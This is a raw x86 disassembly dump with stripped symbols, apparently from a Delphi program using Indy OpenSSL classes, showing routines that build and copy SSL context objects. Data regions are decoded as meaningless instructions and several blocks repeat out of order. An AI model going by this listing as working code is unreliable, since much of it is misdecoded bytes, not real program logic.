add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
push j_sub_40382c#6
push [ fs : eax ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0045d4
add [ eax ] al
add [ edi + ecx * 8 + 0x45 ] ch
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x72 ] si
jb r-xdata
outsd
jb r-xdata
mov esi [ ebx + 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_45d53e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_403eac
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pushad
aad 0x45
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
aam 0x45
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
aam 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ ebp - 0x8 ]
call sub_40416c
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4041b8
mov eax [ ebp - 0xc ]
call sub_40436c
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_4082c8
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d545
mov eax [ rw-data ]
call sub_424574
retn
inc esp
popad
je r-xdata
push 0x45d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2c ] ch
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
or bh bh
push ecx
mov esi [ fs : ebx + 0x34 ]
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
sub_45d3e6
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ecx
push j_sub_40382c#6
push [ fs : eax ]
inc ebp
jb r-xdata
mov esi [ ebx + 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_45d53e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_403eac
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pushad
aad 0x45
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
mov eax [ ebp - 0x8 ]
call sub_40416c
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4041b8
mov eax [ ebp - 0xc ]
call sub_40436c
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_4082c8
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d545
mov eax [ rw-data ]
call sub_424574
retn
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
inc esp
popad
je r-xdata
push 0x45d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2c ] ch
inc ebp
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0045d4
add [ eax ] al
add [ edi + ecx * 8 + 0x45 ] ch
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x72 ] si
jb r-xdata
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
aam 0x45
add [ eax + eax ] cl
add [ eax ] al
insb
iretd
aam 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
or bh bh
push ecx
mov esi [ fs : ebx + 0x34 ]
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
sub_45d573
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45d675
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_45d64b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45c4f8
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
lea edx [ ebp - 0x10 ]
call sub_408450
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059ac
mov eax [ ebp - 0x14 ]
xor ecx ecx
pop edx
call sub_408940
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d652
mov eax [ rw-data ]
call sub_424574
retn
mov eax esi
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_45d684
push ebx
call sub_45b340
test al al
jne r-xdata
call sub_45c508
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
setg bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244e4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244e4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244e4
mov [ rw-data ] eax
xor ebx ebx
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_45d70c
push ecx
mov [ esp ] al
xor eax eax
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
or eax 0x1
test [ esp ] 0x4
je r-xdata
or eax 0x2
pop edx
retn
or eax 0x4
sub_45d730
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_45d86f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403578#2
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edi eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov ebx eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45eb4c
mov edi eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403910
jmp r-xdata
mov eax ebx
call sub_45c4f8
mov ebx eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov eax [ ebx + 0xc ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebx + 0xc ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebp - 0x5 ] al
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov eax [ ebx + 0xc ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov [ ebp - 0x5 ] al
xor eax eax
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0x10 ]
cmp esi [ eax + 0x14 ]
jle r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424574
retn
sub_45d838
call sub_4038e0
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424574
retn
sub_45d880
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f40
mov edi esi
lea eax [ edi + 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_403f00
lea eax [ edi + 0x8 ]
mov edx [ ebx + 0x8 ]
call sub_403f00
lea eax [ edi + 0xc ]
mov edx [ ebx + 0xc ]
call sub_403f00
mov al [ ebx + 0x10 ]
mov [ edi + 0x10 ] al
mov al [ ebx + 0x11 ]
mov [ edi + 0x11 ] al
mov al [ ebx + 0x18 ]
mov [ edi + 0x18 ] al
mov eax [ ebx + 0x14 ]
mov [ edi + 0x14 ] eax
lea eax [ edi + 0x1c ]
mov edx [ ebx + 0x1c ]
call sub_403f00
lea eax [ edi + 0x20 ]
mov edx [ ebx + 0x20 ]
call sub_403f00
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45d8f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458dd8
mov [ esi + 0x70 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ esi + 0x6c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45d940
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
cmp [ esi + 0x68 ] 0x0
je r-xdata
mov eax [ esi + 0x6c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458e70
test bl bl
jle r-xdata
lea eax [ esi + 0x68 ]
call sub_40cb14
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45d980
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45df14
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x34 ] ebx
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x4 ]
call sub_403f00
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x8 ]
call sub_403f00
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0xc ]
call sub_403f00
mov eax [ ebx + 0x6c ]
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x18 ]
mov [ esi + 0x18 ] al
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x1c ]
call sub_403f00
lea eax [ esi + 0x20 ]
mov edx [ ebx + 0x6c ]
mov edx [ edx + 0x20 ]
call sub_403f00
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov [ esi + 0x29 ] 0x0
mov [ esi + 0x29 ] 0x1
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x10 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x6c ]
mov al [ eax + 0x11 ]
mov [ esi + 0x5 ] al
mov dl 0x1
mov eax [ ebx + 0x68 ]
call sub_45e014
mov [ ebx + 0x70 ] 0x1
pop esi
pop ebx
retn
sub_45da38
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45db54
mov [ esp ] eax
mov eax [ esp ]
mov [ eax + 0x84 ] 0x1
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx esi
call sub_45a3a4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor ebx ebx
mov eax esp
call sub_40cb14
mov eax [ esp ]
mov edx [ ebx + 0x6c ]
mov [ eax + 0x7c ] edx
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e5b4
mov edx [ esp ]
mov [ edx + 0x80 ] eax
mov eax [ esp ]
mov edx [ ebx + 0x68 ]
mov [ eax + 0x78 ] edx
mov ebx [ esp ]
jmp r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
sub_45dac0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_45db06
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x7a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db0d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_45db54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45ad88
mov [ esi + 0x84 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ esi + 0x7c ] eax
mov [ esi + 0xa0 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45dba8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
lea eax [ esi + 0x80 ]
call sub_40cb14
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45af90
test bl bl
jle r-xdata
lea eax [ esi + 0x78 ]
call sub_40cb14
mov eax [ esi + 0x7c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45dbf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45ab90
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
push ebp
push j_sub_4036a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45dd64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_45dc4a
add [ eax ] eax
add [ eax ] al
sub al dl
inc ebp
add [ esi - 0x24 ] dl
inc ebp
add [ ebx - 0x477f03bb ] cl
mov al 0x0
add [ eax ] al
add [ ebp + 0x5 ] dh
call sub_40388c
call sub_4038e0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_45dd00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403578
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_459254
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
call sub_45e6a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45dd64
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45df14
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0x34 ] ebx
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x4 ]
call sub_403f00
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x8 ]
call sub_403f00
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0xc ]
call sub_403f00
mov eax [ ebx + 0x7c ]
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x18 ]
mov [ esi + 0x18 ] al
lea eax [ esi + 0x1c ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x1c ]
call sub_403f00
lea eax [ esi + 0x20 ]
mov edx [ ebx + 0x7c ]
mov edx [ edx + 0x20 ]
call sub_403f00
cmp [ ebx + 0x9a ] 0x0
je r-xdata
mov [ esi + 0x29 ] 0x0
mov [ esi + 0x29 ] 0x1
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x10 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x7c ]
mov al [ eax + 0x11 ]
mov [ esi + 0x5 ] al
xor edx edx
mov eax [ ebx + 0x78 ]
call sub_45e014
pop esi
pop ebx
retn
sub_45de1c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push j_sub_40382c#5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de72
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_45deb8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e5b4
mov esi eax
mov [ ebx + 0x80 ] esi
mov eax [ ebx + 0x78 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0xc ]
mov ecx [ ebx + 0x78 ]
mov eax esi
call sub_45e898
sub_45df14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45dfa4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030c0
cmp [ rw-data ] 0x0
jg r-xdata
add esp 0xfffffff0
call sub_4033fc
inc [ rw-data ]
mov al [ r-xdata ]
mov [ esi + 0x18 ] al
mov [ esi + 0x5 ] 0x0
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dfab
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
call sub_45d684
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_45dfc9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_45dff8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45dff8
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45e014
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_45e268
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_45dff8
cmp [ edi + 0x5 ] 0x0
jne r-xdata
mov eax edi
call sub_45e310
mov esi eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov ebx eax
mov [ edi + 0x24 ] ebx
test ebx ebx
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
push edi
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
cmp [ edi + 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov [ edi + 0x5 ] 0x1
mov [ edi + 0x5 ] 0x2
jmp r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45e4e8
test al al
jne r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax edi
call sub_45e524
test al al
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp [ edi + 0x28 ] 0x0
je r-xdata
mov eax edi
call sub_45e560
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp [ edi + 0x20 ] 0x0
je r-xdata
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
push r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov esi eax
mov eax [ edi + 0x20 ]
call sub_40436c
call sub_408484
mov ebx eax
push ebx
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov esi eax
mov eax ebx
call sub_4084b0
jmp r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x18 ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
test esi esi
jg r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov cl [ edi + 0x29 ]
mov dl [ edi + 0x18 ]
mov eax edi
call sub_45e2ac
cmp [ edi + 0x8 ] 0x0
je r-xdata
push 0x4
lea eax [ edi + 0x2c ]
push eax
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e26f
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_403ed0
retn
mov eax [ edi + 0x8 ]
call sub_40436c
call sub_408484
mov ebx eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax ebx
call sub_4084b0
sub_45e2ac
push ebx
push esi
push ecx
mov [ esp ] dl
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
test cl cl
je r-xdata
push 0x0
mov al [ esp + 0x4 ]
call sub_45d70c
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
push sub_45d730
mov al [ esp + 0x4 ]
call sub_45d70c
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
jmp r-xdata
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
sub_45e310
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor edx edx
push ebp
push sub_45e4da
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x5 ] 0x0
jne r-xdata
mov dl [ eax + 0x4 ]
sub dl 0x1
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov al [ eax + 0x5 ]
dec al
je r-xdata
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
dec dl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e4e1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
mov eax [ rw-data ]
mov eax [ eax ]
